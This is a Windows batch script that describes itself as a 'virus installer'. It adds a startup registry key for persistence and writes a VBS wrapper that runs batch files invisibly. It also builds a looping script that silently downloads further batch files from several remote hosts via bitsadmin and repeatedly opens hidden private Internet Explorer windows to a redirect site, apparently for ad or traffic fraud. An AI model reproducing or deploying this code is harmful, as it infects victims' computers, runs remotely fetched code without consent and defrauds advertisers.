
REM initial virus installer



REM create batch1.bat
REM check for update from github, if update, run it and delte old.
REM download IE_default_browser.bat
REM run 5 linkbucks links





REM create regkey startup batch1.bat at startup
@echo off
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v initial /t reg_sz /d C:\Users\%username%\Local\silentrunner.bat





REM Makes the batch file invisible so no CMD prompt shows. puts the invisible code in a vbs file.
type NUL > C:\Users\%username%\Downloads\msdfmap.vbs
set pwd=CreateObject("Wscript.Shell").Run """" ^^^& WScript.Arguments(0) ^^^& """", 0, False
ECHO %pwd% >> C:\Users\%username%\Downloads\msdfmap.vbs
copy /y "C:\Users\%username%\Downloads\msdfmap.vbs" "C:\Users\%username%\AppData\Local"
del C:\Users\%username%\Downloads\msdfmap.vbs




REM This builds the code for msdfmap.bat
REM msdfmap.bat is designed to open the internet to a specific website in incognito mode and minimized every 4 minutes
type NUL > C:\Users\%username%\Downloads\msdfmap.bat
ECHO @echo off >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ping -n 1 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
REM The below  code downloads a new update. Three different sources incase one goes down.  This adds the code to the msdfmap.bat file.
ECHO IF EXIST "C:\Users\%username%\Downloads\update17.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO 	echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO 	bitsadmin /transfer n /download /priority normal "https://bitbucket.org/AndroidPrior/androidprior/downloads/update17.bat" "C:\Users\%username%\Downloads\update17.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO )	 >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO IF EXIST "C:\Users\%username%\Downloads\update17.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO     echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO     bitsadmin /transfer n /download /priority normal "https://raw.githubusercontent.com/AndroidPrior/androidprior/master/update17.bat" "C:\Users\%username%\Downloads\update17.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO IF EXIST "C:\Users\%username%\Downloads\update17.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO     echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO     bitsadmin /transfer n /download /priority normal "http://androidfriends.onlinewebshop.net/update17.bat" "C:\Users\%username%\Downloads\update17.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat


REM Download Set_IE_AS_DEFAULT_BROWSER.bat
ECHO IF EXIST "C:\Users\%username%\Appdata\Local\set_IE_as_default_browser.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO     echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO     bitsadmin /transfer n /download /priority normal "https://raw.githubusercontent.com/AndroidPrior/androidprior/master/Set_IE_as_default_browser.bat" "C:\Users\%username%\Downloads\set_IE_as_default_browser.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO     copy /y "C:\Users\%username%\Downloads\set_IE_as_default_browser.bat" "C:\Users\%username%\AppData\Local" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO 	 del C:\Users\%username%\Downloads\set_IE_as_default_browser.bat >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO IF EXIST "C:\Users\%username%\Appdata\Local\set_IE_as_default_browser.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO     echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO     bitsadmin /transfer n /download /priority normal "https://bitbucket.org/AndroidPrior/androidprior/downloads/Set_IE_as_default_browser.bat" "C:\Users\%username%\Downloads\set_IE_as_default_browser.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO     copy /y "C:\Users\%username%\Downloads\set_IE_as_default_browser.bat" "C:\Users\%username%\AppData\Local" >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO 	 del C:\Users\%username%\Downloads\set_IE_as_default_browser.bat >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ping -n 1 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat




type NUL > C:\Users\%username%\Downloads\silentrunner.bat
ECHO @echo off >> C:\Users\%username%\Downloads\silentrunner.bat
ECHO wscript.exe C:\Users\%username%\AppData\Local\msdfmap.vbs C:\Users\%username%\AppData\Local\msdfmap.bat >> C:\Users\%username%\Downloads\silentrunner.bat
copy /y "C:\Users\%username%\Downloads\silentrunner.bat" "C:\Users\%username%\AppData\Local"
del C:\Users\%username%\Downloads\silentrunner.bat


ECHO :loop6 >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ping -n 3 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Local\set_IE_as_default_browser.bat >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ping -n 10 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://google.com >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://bing.com >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://yahoo.com >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://duckduckgo.com >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://google.com >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://bing.com >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://yahoo.com >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO start /min iexplore.exe -private http://google.com>> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ping -n 5 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO taskkill /f /im iexplore.exe >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO ping -n 86400 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
ECHO goto loop6  >> C:\Users\%username%\Downloads\msdfmap.bat

